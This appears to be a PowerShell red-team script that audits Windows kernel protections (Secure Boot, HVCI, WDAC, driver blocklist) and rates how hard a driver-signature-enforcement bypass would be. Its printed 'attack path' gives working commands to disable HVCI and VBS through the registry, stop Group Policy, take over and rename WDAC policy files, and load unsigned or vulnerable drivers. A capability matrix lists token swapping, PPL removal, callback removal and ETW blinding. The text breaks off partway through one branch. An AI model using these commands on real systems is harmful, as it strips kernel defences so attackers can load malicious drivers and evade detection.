# Check-DeviceGuard.ps1
# Kernel Security Posture & DSE Bypass Assessment

param(
    [string]$LolDriversJson
)

# --- Silent Data Collection ---
$dg       = Get-CimInstance -Namespace root\Microsoft\Windows\DeviceGuard -ClassName Win32_DeviceGuard
$dgReg    = "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard"
$vbsStatus = [int]$dg.VirtualizationBasedSecurityStatus
$kmci     = [int]$dg.CodeIntegrityPolicyEnforcementStatus
$umci     = [int]$dg.UsermodeCodeIntegrityPolicyEnforcementStatus
$hvciOn   = $dg.SecurityServicesRunning -contains 2
$cgOn     = $dg.SecurityServicesRunning -contains 1
$sgOn     = $dg.SecurityServicesRunning -contains 3
$sgCfg    = $dg.SecurityServicesConfigured -contains 3
$vbsOn    = $vbsStatus -eq 2

$sb = $false; try { $sb = Confirm-SecureBootUEFI } catch {}
$dbxSz = $null; if ($sb) { try { $dbxSz = (Get-SecureBootUEFI dbx -EA Stop).bytes.Length } catch {} }

$bcdTs = $false; $bcdDbg = $false; $bcdNi = $false
try {
    $b = bcdedit /enum "{current}" 2>&1 | Out-String
    if ($b -match "testsigning\s+(Yes|Ja)")      { $bcdTs  = $true }
    if ($b -match "debug\s+(Yes|Ja)")             { $bcdDbg = $true }
    if ($b -match "nointegritychecks\s+(Yes|Ja)") { $bcdNi  = $true }
} catch {}

$blPath   = "C:\Windows\System32\CodeIntegrity\driversipolicy.p7b"
$blExists = Test-Path $blPath
$blOff    = $false; $blReg = $null
$ciCfg    = "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Config"
if (Test-Path $ciCfg) {
    $blReg = (Get-ItemProperty -Path $ciCfg -Name "VulnerableDriverBlocklistEnable" -EA SilentlyContinue).VulnerableDriverBlocklistEnable
    if ($null -ne $blReg -and [int]$blReg -eq 0) { $blOff = $true }
}
$blActive = $blExists -and -not $blOff

# --- UEFI Lock Detection ---
# Track HVCI and CG locks independently.
# Only HVCI lock determines whether DSE bypass requires firmware intervention.
# CG lock is informational but does not affect driver loading capability.

$hvciLk = $false; $cgLk = $false
$hSc = "$dgReg\Scenarios\HypervisorEnforcedCodeIntegrity"
if (Test-Path $hSc) { if ((Get-ItemProperty -Path $hSc -Name "Locked" -EA SilentlyContinue).Locked -eq 1) { $hvciLk = $true } }
$cSc = "$dgReg\Scenarios\CredentialGuard"
if (Test-Path $cSc) { if ((Get-ItemProperty -Path $cSc -Name "Locked" -EA SilentlyContinue).Locked -eq 1) { $cgLk = $true } }

# LsaCfgFlags: 0 = Disabled, 1 = Enabled WITH UEFI Lock, 2 = Enabled WITHOUT Lock
$lsaCfg = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "LsaCfgFlags" -EA SilentlyContinue).LsaCfgFlags
if ($lsaCfg -eq 1) { $cgLk = $true }

# HVCI lock alone drives difficulty assessment and attack path decisions.
# CG lock is displayed separately but does not inflate the DSE bypass difficulty.
$hvciUefiLocked = $hvciLk

$platSec = (Get-ItemProperty -Path $dgReg -Name "RequirePlatformSecurityFeatures" -EA SilentlyContinue).RequirePlatformSecurityFeatures

$gpPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard"
$gpoOn = $false; $gpoEnf = $false; $gpoVals = @{}
if (Test-Path $gpPath) {
    $gpoOn = $true
    (Get-ItemProperty -Path $gpPath -EA SilentlyContinue).PSObject.Properties | Where-Object { $_.Name -notlike 'PS*' } | ForEach-Object { $gpoVals[$_.Name] = $_.Value }
    $gv = $gpoVals["EnableVirtualizationBasedSecurity"]
    if ($null -ne $gv -and [int]$gv -ge 1) { $gpoEnf = $true }
}
$sgLaunch = if ($gpoVals.ContainsKey("ConfigureSystemGuardLaunch")) { [int]$gpoVals["ConfigureSystemGuardLaunch"] } else { $null }
$localVbs = (Get-ItemProperty -Path $dgReg -Name "EnableVirtualizationBasedSecurity" -EA SilentlyContinue).EnableVirtualizationBasedSecurity
$gpoConflict = $gpoOn -and -not $gpoEnf -and $null -ne $localVbs -and [int]$localVbs -ge 1
$gpsvc = Get-Service gpsvc -EA SilentlyContinue

# --- VM Detection ---
$isVM = $false
$csProduct = (Get-CimInstance -Class Win32_ComputerSystemProduct -EA SilentlyContinue).Name
$biosVendor = (Get-CimInstance -Class Win32_BIOS -EA SilentlyContinue).Manufacturer
if ($csProduct -match "Virtual|VMware|VirtualBox|Xen|QEMU|HVM|KVM" -or $biosVendor -match "Hyper-V|VMware|innotek|Xen|QEMU|American Megatrends.*Virtual|KVM") {
    $isVM = $true
}

# --- WDAC Policy Signed Detection ---
# Determines whether the WDAC KMCI policy is signed (cannot be deleted/replaced)
# or unsigned (can be deleted by admin for bypass). This drives the attack path.
$wdacPolicySigned = $null  # $null = unknown, $true = signed, $false = unsigned
$wdacPolicyDetails = @()
$wdacCiToolAvail = $false

if ($kmci -ge 1) {
    # Primary: CiTool.exe (Windows 11 21H2+ / Server 2022+, requires elevation)
    try {
        $ciRaw = CiTool.exe --list-policies -json 2>$null
        if ($ciRaw) {
            $ciJson = $ciRaw | ConvertFrom-Json
            $ciPolicies = $ciJson.Policies
            # Only mark CiTool as available if we actually got policy data
            # Access Denied (0x80070005) returns OperationResult without Policies
            if ($ciPolicies -and $ciPolicies.Count -gt 0) {
                $wdacCiToolAvail = $true
                foreach ($pol in $ciPolicies) {
                    # Skip the Microsoft driver blocklist policy
                    if ($pol.FriendlyName -match "Microsoft Windows Driver Policy|Driver Block") { continue }
                    # Skip unauthorized policies
                    if (-not $pol.IsAuthorized) { continue }

                    $wdacPolicyDetails += [PSCustomObject]@{
                        PolicyID   = $pol.PolicyID
                        Name       = $pol.FriendlyName
                        Enforced   = $pol.IsEnforced
                        Signed     = $pol.IsSignedPolicy
                        System     = $pol.IsSystemPolicy
                        OnDisk     = $pol.IsOnDisk
                    }

                    if ($pol.IsSignedPolicy) { $wdacPolicySigned = $true }
                    elseif ($wdacPolicySigned -ne $true) { $wdacPolicySigned = $false }
                }
            }
        }
    } catch {}

    # Fallback: check policy file locations if CiTool unavailable or access denied
    if (-not $wdacCiToolAvail) {
        $polFiles = @()
        $sipPath  = "C:\Windows\System32\CodeIntegrity\SIPolicy.p7b"
        $vbsPath  = "C:\Windows\System32\CodeIntegrity\VbsSiPolicy.p7b"
        $cipDir   = "C:\Windows\System32\CodeIntegrity\CiPolicies\Active"

        if (Test-Path $sipPath) { $polFiles += $sipPath }
        if (Test-Path $vbsPath) { $polFiles += $vbsPath }
        if (Test-Path $cipDir) {
            Get-ChildItem -Path $cipDir -Filter "*.cip" -EA SilentlyContinue | ForEach-Object { $polFiles += $_.FullName }
        }

        foreach ($pf in $polFiles) {
            # Heuristic: read first 2KB and look for PKCS#7 SignedData OID (1.2.840.113549.1.7.2)
            # Hex: 06 09 2A 86 48 86 F7 0D 01 07 02
            try {
                $bytes = [System.IO.File]::ReadAllBytes($pf)
                $hex = [BitConverter]::ToString($bytes[0..([Math]::Min(2048, $bytes.Length - 1))]) -replace '-',''
                $hasSignedData = $hex -match '06092A864886F70D010702'

                $wdacPolicyDetails += [PSCustomObject]@{
                    PolicyID = "N/A"
                    Name     = [System.IO.Path]::GetFileName($pf)
                    Enforced = ($kmci -eq 2)
                    Signed   = $hasSignedData
                    System   = $false
                    OnDisk   = $true
                }

                if ($hasSignedData) { $wdacPolicySigned = $true }
                elseif ($wdacPolicySigned -ne $true) { $wdacPolicySigned = $false }
            } catch {}
        }
    }
}

# --- Helpers ---
$W = { param($l,$v,$c) Write-Host ("    {0,-28} " -f $l) -NoNewline -ForegroundColor Gray; Write-Host $v -ForegroundColor $c }
$vM = @{0='Off';1='Configured';2='Running'}
$cM = @{0='Off';1='Audit';2='Enforced'}

function Step($n,$t)  { Write-Host "    $n. " -NoNewline -ForegroundColor Cyan; Write-Host $t -ForegroundColor White }
function Note($t)     { Write-Host "       $t" -ForegroundColor DarkGray }
function Cmd($t)      { Write-Host "       > " -NoNewline -ForegroundColor DarkCyan; Write-Host $t -ForegroundColor White }
function WarnBlock($title, $detail, $fix) {
    Write-Host "    ! " -NoNewline -ForegroundColor Yellow; Write-Host $title -ForegroundColor Yellow
    Write-Host "      $detail" -ForegroundColor DarkGray
    if ($fix) { Write-Host "      Fix: " -NoNewline -ForegroundColor DarkCyan; Write-Host $fix -ForegroundColor White }
}

# ===================== OUTPUT =====================

Write-Host ""
Write-Host "  $([string]::new([char]0x2550, 76))" -ForegroundColor DarkCyan
Write-Host "   KERNEL SECURITY POSTURE          $(hostname) | $(Get-Date -F 'yyyy-MM-dd HH:mm')" -ForegroundColor White
Write-Host "  $([string]::new([char]0x2550, 76))" -ForegroundColor DarkCyan

# --- Controls ---
Write-Host "`n   CONTROLS" -ForegroundColor DarkCyan
Write-Host "   $([string]::new([char]0x2500, 73))" -ForegroundColor DarkGray

& $W "Secure Boot"       $(if($sb){"ENABLED"}else{"DISABLED"})                  $(if(!$sb){"Green"}else{"Yellow"})
if ($dbxSz) { & $W "  DBX Size" "$dbxSz bytes" "DarkGray" }
& $W "VBS"               "$vbsStatus ($($vM[$vbsStatus]))"                      $(if(!$vbsOn){"Green"}else{"Yellow"})
& $W "HVCI"              $(if($hvciOn){"RUNNING $(if($hvciLk){'[UEFI LOCKED]'})"}else{"OFF"})  $(if(!$hvciOn){"Green"}else{"Red"})
& $W "WDAC KMCI"         "$kmci ($($cM[$kmci]))"                                $(if($kmci -lt 2){"Green"}else{"Yellow"})
if ($kmci -ge 1) {
    $signedStr = if ($wdacPolicySigned -eq $true) { "SIGNED [tamper-resistant]" }
                 elseif ($wdacPolicySigned -eq $false) { "UNSIGNED [removable]" }
                 else { "UNKNOWN" }
    $signedCol = if ($wdacPolicySigned -eq $true) { "Red" }
                 elseif ($wdacPolicySigned -eq $false) { "Green" }
                 else { "DarkYellow" }
    & $W "  WDAC Policy" $signedStr $signedCol
    foreach ($wp in $wdacPolicyDetails) {
        $polLabel = if ($wp.Name) { $wp.Name } else { $wp.PolicyID }
        $polInfo = "$(if($wp.Enforced){'Enforced'}else{'Audit'}) | $(if($wp.Signed){'Signed'}else{'Unsigned'})"
        & $W "    $polLabel" $polInfo "DarkGray"
    }
}
& $W "WDAC UMCI"         "$umci ($($cM[$umci]))"                                $(if($umci -eq 0){"Green"}elseif($umci -eq 1){"Yellow"}else{"Red"})
& $W "Credential Guard"  $(if($cgOn){"RUNNING $(if($cgLk){'[UEFI LOCKED]'})"}else{"OFF"})  $(if(!$cgOn){"Green"}else{"Yellow"})
& $W "System Guard"      $(if($sgOn){"RUNNING"}elseif($sgCfg){"CONFIGURED"}else{"OFF"})  $(if(!$sgOn -and !$sgCfg){"Green"}else{"Yellow"})
if ($isVM) { & $W "Environment" "VIRTUAL MACHINE" "DarkYellow" }

# --- Enforcement ---
Write-Host "`n   ENFORCEMENT" -ForegroundColor DarkCyan
Write-Host "   $([string]::new([char]0x2500, 73))" -ForegroundColor DarkGray

& $W "BCD testsigning"   $(if($bcdTs){"YES"}else{"No"})                         $(if($bcdTs){"Green"}else{"DarkGray"})
& $W "BCD debug"         $(if($bcdDbg){"YES"}else{"No"})                        $(if($bcdDbg){"Green"}else{"DarkGray"})
& $W "BCD nointegrity"   $(if($bcdNi){"YES"}else{"No"})                         $(if($bcdNi){"Green"}else{"DarkGray"})

if ($blExists) {
    $bi = Get-Item $blPath
    & $W "Blocklist" "ACTIVE ($($bi.Length)B, $($bi.LastWriteTime.ToString('yyyy-MM-dd')))" $(if($blOff){"Green"}else{"Yellow"})
} else { & $W "Blocklist" "Not present" "Green" }
if ($blOff) { & $W "  Registry Override" "DISABLED" "Green" }

if ($gpoOn) {
    & $W "GPO" $(if($gpoEnf){"ENFORCING VBS"}else{"Disabling VBS"}) $(if(!$gpoEnf){"Green"}else{"Yellow"})
    foreach ($k in $gpoVals.Keys) { & $W "  $k" "$($gpoVals[$k])" "DarkGray" }
}
if ($null -ne $localVbs) {
    & $W "Local EnableVBS" "$localVbs $(if([int]$localVbs -ge 1){'(enabled)'}else{'(disabled)'})" $(if([int]$localVbs -eq 0){"Green"}else{"Yellow"})
}
$pM = @{1='SecureBoot';3='SecureBoot+DMA'}
if ($platSec) { & $W "Platform Security" "$platSec ($($pM[[int]$platSec]))" "DarkGray" }

# --- Warnings ---
$hasWarn = $false
function EnsureWarnHeader {
    if (!$script:hasWarn) {
        Write-Host "`n   WARNINGS" -ForegroundColor DarkCyan
        Write-Host "   $([string]::new([char]0x2500, 73))" -ForegroundColor DarkGray
        $script:hasWarn = $true
    }
}

if ($gpoConflict) {
    EnsureWarnHeader
    WarnBlock "GPO / Local Registry Conflict" `
        "GPO policy key (SOFTWARE\Policies) sets EnableVBS=0, but the boot key (SYSTEM\CurrentControlSet\Control\DeviceGuard) has EnableVBS=$localVbs. The boot manager reads only the SYSTEM hive, so VBS stays running despite GPO." `
        "reg add `"HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard`" /v EnableVirtualizationBasedSecurity /t REG_DWORD /d 0 /f && shutdown /r /t 0"
}
if ($sgCfg -or ($null -ne $sgLaunch -and $sgLaunch -ge 1)) {
    EnsureWarnHeader
    WarnBlock "SystemGuard keeping hypervisor alive" `
        "ConfigureSystemGuardLaunch=$sgLaunch in GPO configures System Guard Secure Launch, which requires the VBS hypervisor. Even with EnableVBS=0, the hypervisor stays loaded because SystemGuard is a VBS consumer." `
        "reg delete `"HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard`" /v ConfigureSystemGuardLaunch /f && shutdown /r /t 0"
}
if ($sb -and ($bcdTs -or $bcdDbg -or $bcdNi)) {
    EnsureWarnHeader
    WarnBlock "BCD flags nullified by Secure Boot" `
        "Secure Boot firmware validates BCD integrity at boot. testsigning, debug, and nointegritychecks flags are silently ignored when Secure Boot is enabled. Disable Secure Boot in BIOS/UEFI first." `
        $null
}
if ($vbsOn -and !$hvciOn) {
    EnsureWarnHeader
    WarnBlock "VBS loaded without HVCI" `
        "Hypervisor is active (VTL0/VTL1 split exists) but HVCI is not consuming it. ci.dll enforces DSE in VTL0 only, meaning g_CiOptions is in normal kernel memory and writable via arbitrary kernel R/W primitive." `
        $null
}
if ($gpoEnf) {
    EnsureWarnHeader
    WarnBlock "GPO enforcing VBS" `
        "Group Policy refreshes every ~90min and on reboot, overwriting local registry changes to EnableVBS. Any manual registry disable will be reverted unless GP Client is stopped or SYSVOL access is blocked." `
        "sc stop gpsvc && sc config gpsvc start= disabled (before making registry changes)"
}
if ($cgLk -and !$hvciLk) {
    EnsureWarnHeader
    WarnBlock "Credential Guard UEFI locked (HVCI is NOT locked)" `
        "CG is UEFI locked and cannot be disabled without firmware intervention. However, HVCI is not UEFI locked and can be disabled via registry. CG lock does not prevent DSE bypass or unsigned driver loading." `
        $null
}
if ($kmci -eq 2) {
    EnsureWarnHeader
    $polSignNote = if ($wdacPolicySigned -eq $true) { "Policy is SIGNED: cannot be deleted or replaced without authorized signer key." }
                   elseif ($wdacPolicySigned -eq $false) { "Policy is UNSIGNED: can be deleted/renamed by admin (takeown + rename + reboot)." }
                   else { "Policy signature status unknown. Try rename to test." }
    WarnBlock "WDAC Kernel Mode Code Integrity ENFORCED" `
        "A WDAC KMCI policy is enforced. Even with g_CiOptions=0, the WDAC policy can independently block drivers not covered by the policy allow rules. WDAC operates as a separate enforcement layer above basic DSE. $polSignNote" `
        $null
}
$gpoHvci = $gpoVals["HypervisorEnforcedCodeIntegrity"]
if ($gpoOn -and $null -ne $gpoHvci -and [int]$gpoHvci -ge 1 -and !$hvciOn) {
    EnsureWarnHeader
    $scEnabled = (Get-ItemProperty -Path $hSc -Name "Enabled" -EA SilentlyContinue).Enabled
    $lockArmed = $hvciLk
    $targetDiff = if ($lockArmed) { "VERY HARD (UEFI Lock already armed: Scenario Key Locked=1)" } else { "HARD" }
    WarnBlock "GPO requests HVCI but HVCI is NOT running" `
        "GPO sets HypervisorEnforcedCodeIntegrity=$gpoHvci (Scenario Key Enabled=$(if($null -eq $scEnabled){'N/A'}else{$scEnabled})), but WMI reports HVCI inactive. Likely cause: incompatible kernel driver or missing hardware support. Current posture is MODERATE (g_CiOptions patchable). If the blocking condition is resolved, HVCI activates on next reboot, shifting posture to $targetDiff." `
        $null
}

# --- Difficulty ---
# Only $hvciUefiLocked (HVCI lock) determines base difficulty, not CG lock.
# CG lock protects LSASS credentials but does not affect driver loading.
# WDAC KMCI enforcement is shown as a qualifier since it adds an independent blocking layer.
$wdacTag = if ($kmci -eq 2 -and $wdacPolicySigned -eq $true) { " [+WDAC:Signed]" }
           elseif ($kmci -eq 2 -and $wdacPolicySigned -eq $false) { " [+WDAC:Unsigned]" }
           elseif ($kmci -eq 2) { " [+WDAC]" }
           elseif ($kmci -eq 1) { " [WDAC:Audit]" }
           else { "" }
$diff = if     (!$sb -and ($bcdTs -or $bcdNi))              { "TRIVIAL" }
        elseif (!$sb)                                        { "EASY" }
        elseif ($sb -and !$hvciOn -and !$blActive)           { "MODERATE" }
        elseif ($sb -and !$hvciOn -and $blActive)            { "MODERATE" }
        elseif ($sb -and $hvciOn -and !$hvciUefiLocked)      { "HARD" }
        elseif ($sb -and $hvciOn -and $hvciUefiLocked)       { "VERY HARD" }
        else                                                  { "UNKNOWN" }
$dc = switch($diff) { "TRIVIAL"{"Green"} "EASY"{"Green"} "MODERATE"{"Yellow"} "HARD"{"Red"} "VERY HARD"{"Red"} default{"Gray"} }

Write-Host "`n   DSE BYPASS: " -NoNewline -ForegroundColor DarkCyan
Write-Host "$diff$wdacTag" -NoNewline -ForegroundColor $dc
if ($wdacTag) { Write-Host " (WDAC policy blocks unlisted drivers independently of DSE)" -ForegroundColor DarkYellow } else { Write-Host "" }

# ===================== LEGEND =====================

Write-Host "`n  $([string]::new([char]0x2550, 76))" -ForegroundColor DarkGray
Write-Host "   LEGEND" -ForegroundColor White
Write-Host "  $([string]::new([char]0x2550, 76))" -ForegroundColor DarkGray

$legend = [ordered]@{
    "Secure Boot"       = "Firmware validates boot chain signatures (bootloader, kernel, boot drivers).`n" +
                          "BCD flags (testsigning, debug, nointegritychecks) are ignored when active.`n" +
                          "Does NOT block validly signed BYOVD drivers. Prevents BCD-based DSE disable."
    "VBS"               = "Activates Windows Hypervisor, splits memory into VTL0 (normal) and VTL1 (secure).`n" +
                          "Infrastructure layer only. Without HVCI or CG as consumer, no direct security effect.`n" +
                          "VBS alone does not affect DSE or driver loading."
    "HVCI"              = "Moves code integrity enforcement to Secure Kernel (skci.dll) in VTL1.`n" +
                          "EPT W^X on kernel code pages: writable XOR executable, never both.`n" +
                          "Blocks unsigned drivers and kernel code injection. Data-only attacks (token swap,`n" +
                          "PPL zero, callback removal, ETW blind) still work since EPROCESS is in VTL0."
    "UEFI Lock"         = "Persists HVCI/CG enable state in UEFI variables protected by Secure Boot.`n" +
                          "Registry changes to scenario keys are ignored on normal boot.`n" +
                          "Removal requires firmware intervention (SecConfig.efi, SB key clear).`n" +
                          "Irrelevant in Safe Mode: hypervisor never starts regardless of lock state."
    "WDAC KMCI"         = "Separate code integrity policy layer above DSE. Evaluates allow/deny rules`n" +
                          "by hash, signer, or file attribute. Operates independently of g_CiOptions.`n" +
                          "Even with DSE disabled (g_CiOptions=0), WDAC can block unlisted drivers."
    "Blocklist"         = "Microsoft-maintained WDAC policy (driversipolicy.p7b) blocking known BYOVD`n" +
                          "drivers by hash/certificate. Updated via Windows Update. Disable via registry`n" +
                          "requires reboot. Windows Update may re-enable after cumulative updates."
    "BCD Flags"         = "testsigning: accept test-signed drivers. nointegritychecks: disable CI entirely.`n" +
                          "debug: enable kernel debugging (g_CiOptions patchable via remote debugger).`n" +
                          "All three silently ignored when Secure Boot is active."
    "Credential Guard"  = "Isolates LSASS credentials in VTL1 (Isolated LSA). Prevents credential dumping`n" +
                          "even with SYSTEM privileges. CG UEFI lock does NOT affect DSE or driver loading.`n" +
                          "Only relevant when targeting LSASS/credential access."
    "System Guard"      = "DRTM-based boot chain attestation. VBS consumer: keeps hypervisor alive even if`n" +
                          "EnableVBS=0. Must be disabled separately (ConfigureSystemGuardLaunch) to fully`n" +
                          "unload hypervisor. Does not block driver loading directly."
}

foreach ($key in $legend.Keys) {
    Write-Host "    $key" -ForegroundColor Cyan
    foreach ($line in $legend[$key].Split("`n")) {
        Write-Host "      $line" -ForegroundColor DarkGray
    }
    Write-Host ""
}

# ===================== CAPABILITY MATRIX =====================

Write-Host "  $([string]::new([char]0x2550, 76))" -ForegroundColor Magenta
Write-Host "   CAPABILITY MATRIX                                     [*] = current state" -ForegroundColor White
Write-Host "  $([string]::new([char]0x2550, 76))" -ForegroundColor Magenta
Write-Host ""

$activeCol = if (!$sb) { 0 } elseif ($sb -and !$hvciOn) { 1 } elseif ($sb -and $hvciOn -and !$hvciUefiLocked) { 2 } else { 3 }

# When SB is off but HVCI is running, some SB Off capabilities change
$sbOffHvci = !$sb -and $hvciOn

$headers = @($(if($sbOffHvci){"SBOff+HV"}else{"SB Off"}),"SB+NoHV","SB+HVCI","SB+Lock")

Write-Host ("    {0,-34}" -f "") -NoNewline
for ($i = 0; $i -lt 4; $i++) {
    $h = if ($i -eq $activeCol) { "$($headers[$i])*" } else { $headers[$i] }
    Write-Host ("{0,9}" -f $h) -NoNewline -ForegroundColor $(if($i -eq $activeCol){"Cyan"}else{"White"})
}
Write-Host ""
Write-Host "    $([string]::new([char]0x2500, 70))" -ForegroundColor DarkGray

$Y = "YES"; $N = " no"; $A = "n/a"
$matrix = @(
    @("DSE bypass available",          $Y,  $Y,     $N,  $N),
    @("  via BCD flags",               $Y,  $N,     $N,  $N),
    @("  via g_CiOptions patch",       $(if($sbOffHvci){$N}else{$Y}),  $Y,     $N,  $N),
    @("  via WinRE Safe Mode",         $A,  $A,     $Y,  $Y),
    @("Unsigned driver (post-bypass)", $(if($sbOffHvci){" 2)"}else{$Y}),  $Y,     " 1)", " 1)"),
    @("BYOVD driver load",            "$Y*", "$Y*", "$Y*", "$Y*"),
    @("Token swap (EPROCESS.Token)",   $Y,  $Y,     $Y,  $Y),
    @("PPL zero (EPROCESS.Protection)",$Y,  $Y,     $Y,  $Y),
    @("Callback removal (Notify)",     $Y,  $Y,     $Y,  $Y),
    @("ETW blind (provider patch)",    $Y,  $Y,     $Y,  $Y),
    @("Kernel code exec (W^X)",        $(if($sbOffHvci){$N}else{$Y}),  $Y,     $N,  $N),
    @("Disable HVCI (registry)",       $(if($sbOffHvci){$Y}else{$A}),  $A,     $Y,  $N),
    @("Disable HVCI (firmware)",       $A,  $A,     $Y,  $Y),
    @("Disable HVCI (WinRE SafeMode)", $A,  $A,     $Y,  $Y)
)

foreach ($r in $matrix) {
    Write-Host ("    {0,-34}" -f $r[0]) -NoNewline -ForegroundColor Gray
    for ($i = 0; $i -lt 4; $i++) {
        $v = $r[$i + 1]
        $isAct = ($i -eq $activeCol)
        $c = if ($v -match "YES") { if($isAct){"Green"}else{"DarkGreen"} }
             elseif ($v -match "n/a") { "DarkGray" }
             elseif ($v -match "\d\)") { if($isAct){"Yellow"}else{"DarkYellow"} }
             else { if($isAct){"Red"}else{"DarkGray"} }
        Write-Host ("{0,9}" -f $v) -NoNewline -ForegroundColor $c
    }
    Write-Host ""
}
Write-Host "    $([string]::new([char]0x2500, 70))" -ForegroundColor DarkGray
Write-Host "    * BYOVD requires valid Authenticode signature + RFC3161 timestamp" -ForegroundColor DarkGray
Write-Host "      within certificate validity period, and driver not on blocklist" -ForegroundColor DarkGray
Write-Host "    1) Only via WinRE Safe Mode bypass (HVCI inactive), not during" -ForegroundColor DarkGray
Write-Host "       normal operation. Requires physical access + reboot." -ForegroundColor DarkGray
if ($sbOffHvci) {
    Write-Host "    2) HVCI is running despite Secure Boot being off. Unsigned drivers" -ForegroundColor Yellow
    Write-Host "       require disabling HVCI first (registry + reboot). Test-signed" -ForegroundColor Yellow
    Write-Host "       drivers work via BCD testsigning without disabling HVCI." -ForegroundColor Yellow
}
if ($kmci -eq 2) {
    Write-Host "    ! WDAC KMCI enforced: all capabilities above are additionally gated" -ForegroundColor Yellow
    Write-Host "      by WDAC policy allow rules. Drivers not in the policy are blocked" -ForegroundColor Yellow
    Write-Host "      regardless of signature status or g_CiOptions value." -ForegroundColor Yellow
}

# ===================== ATTACK PATH =====================

Write-Host "`n  $([string]::new([char]0x2550, 76))" -ForegroundColor Magenta
Write-Host "   ATTACK PATH" -ForegroundColor White
Write-Host "  $([string]::new([char]0x2550, 76))" -ForegroundColor Magenta
Write-Host ""

# --- WDAC preamble (shown once before any attack path if KMCI enforced) ---
if ($kmci -eq 2) {
    $signedLabel = if ($wdacPolicySigned -eq $true) { "SIGNED" }
                   elseif ($wdacPolicySigned -eq $false) { "UNSIGNED" }
                   else { "SIGNATURE UNKNOWN" }
    $signedColor = if ($wdacPolicySigned -eq $true) { "Red" }
                   elseif ($wdacPolicySigned -eq $false) { "Yellow" }
                   else { "DarkYellow" }

    Write-Host "    ! WDAC KMCI ENFORCED [$signedLabel]" -ForegroundColor $signedColor
    Note "A WDAC kernel-mode policy is active. This is an independent enforcement layer"
    Note "above DSE. Even after disabling DSE (g_CiOptions=0), the WDAC policy evaluates"
    Note "every driver load against its allow rules (hash, signer, file attributes)."
    Note "Impact: your BYOVD driver AND your target driver must both be covered by the"
    Note "WDAC allow rules, or the policy must be disabled/set to audit first."
    Note ""

    if ($wdacPolicySigned -eq $false) {
        Note "WDAC bypass options (policy is UNSIGNED, admin-removable):"
        Note "  1. Delete/rename the WDAC policy file and reboot (simplest):"
        Note "     Single policy format:"
        Cmd "takeown /f `"C:\Windows\System32\CodeIntegrity\SIPolicy.p7b`""
        Cmd "icacls `"C:\Windows\System32\CodeIntegrity\SIPolicy.p7b`" /grant administrators:F"
        Cmd "ren `"C:\Windows\System32\CodeIntegrity\SIPolicy.p7b`" `"SIPolicy.old`""
        Note "     Multiple policy format (check for .cip files):"
        Cmd "dir C:\Windows\System32\CodeIntegrity\CiPolicies\Active\"
        Note "     Remove .cip files (NOT driversipolicy.p7b, that is the blocklist)"
        Note "  2. Use a driver whose signer matches WDAC allow rules (no reboot):"
        Note "     Microsoft WHQL-signed drivers (KslD.sys, ThrottleStop.sys) are likely"
        Note "     covered by default allow rules for Microsoft signers."
    } elseif ($wdacPolicySigned -eq $true) {
        Write-Host "    ! Policy is SIGNED. Cannot be deleted, renamed, or replaced without" -ForegroundColor Red
        Write-Host "      a signed update policy from the authorized signer." -ForegroundColor Red
        Note ""
        Note "WDAC bypass options (limited):"
        Note "  1. Use a driver whose signer matches WDAC allow rules (only viable option):"
        Note "     Microsoft WHQL-signed drivers (KslD.sys, ThrottleStop.sys) are likely"
        Note "     covered by default allow rules for Microsoft signers."
        Note "  2. Obtain the signing certificate and deploy a permissive update policy"
        Note "     (requires access to the WDAC policy signing key, unlikely in most scenarios)"
        Note "  3. Boot into Safe Mode or WinRE: WDAC policies may not load in Safe Mode"
        Note "     depending on policy configuration (not guaranteed)"
    } else {
        Note "WDAC bypass options (unable to determine if policy is signed):"
        Note "  1. Try to delete/rename the policy file (works if unsigned):"
        Cmd "takeown /f `"C:\Windows\System32\CodeIntegrity\SIPolicy.p7b`""
        Cmd "icacls `"C:\Windows\System32\CodeIntegrity\SIPolicy.p7b`" /grant administrators:F"
        Cmd "ren `"C:\Windows\System32\CodeIntegrity\SIPolicy.p7b`" `"SIPolicy.old`""
        Note "     If rename succeeds but policy persists after reboot: policy is signed."
        Note "  2. Use a driver whose signer matches WDAC allow rules (always works):"
        Note "     Microsoft WHQL-signed drivers (KslD.sys, ThrottleStop.sys) are likely"
        Note "     covered by default allow rules for Microsoft signers."
    }

    Write-Host ""
    Write-Host "    $([string]::new([char]0x2500, 70))" -ForegroundColor DarkGray
    Write-Host ""
}

if (!$sb -and ($bcdTs -or $bcdNi)) {
    # --- TRIVIAL: BCD already relaxed ---
    Write-Host "    + DSE relaxed via BCD. Driver signature enforcement is disabled." -ForegroundColor Green
    Note "ci.dll still runs but accepts any/no signature due to active BCD override."
    Write-Host ""
    Step 1 "sc create Drv type= kernel binPath= C:\path\to\driver.sys"
    Step 2 "sc start Drv"

    if ($hvciOn) {
        Write-Host ""
        Write-Host "    * HVCI is running (does not block BCD-relaxed drivers):" -ForegroundColor Yellow
        if ($bcdTs) {
            Note "testsigning is active. Test-signed drivers pass HVCI validation because"
            Note "HVCI enforces signature checks, and test certificates are accepted when"
            Note "testsigning is enabled. Driver loading works."
        }
        if ($bcdNi) {
            Note "nointegritychecks is active. This disables CI enforcement entirely."
            Note "Note: with HVCI, skci.dll in VTL1 may still enforce independently."
            Note "If driver fails to load, fall back to testsigning instead."
        }
        Note "W^X is enforced: g_CiOptions patching and unsigned code injection blocked."
        Note "Data-only attacks (token swap, PPL zero, callback removal) still work."
    }
}
elseif (!$sb -and $bcdDbg) {
    # --- EASY: Debug mode, attach and patch ---
    Write-Host "    + Kernel debug enabled. Attach remote debugger to patch DSE at runtime." -ForegroundColor Green
    Note "g_CiOptions in ci.dll controls DSE. Setting it to 0 disables all driver"
    Note "signature checks. Requires a second machine on the same network."
    Write-Host ""

    if ($hvciOn) {
        Write-Host "    ! HVCI is running. g_CiOptions patching via debugger will NOT work." -ForegroundColor Red
        Note "HVCI enforces code integrity via skci.dll in VTL1 independently of ci.dll."
        Note "Debugger writes to g_CiOptions in VTL0 have no effect on VTL1 enforcement."
        Note "Use BCD testsigning instead (test-signed drivers pass HVCI validation):"
        Cmd "bcdedit /set testsigning on && shutdown /r /t 0"
        Note ""
        Note "Alternative: disable HVCI first, then use debugger:"
        Cmd "reg add `"HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity`" /v Enabled /t REG_DWORD /d 0 /f"
        Cmd "shutdown /r /t 0"
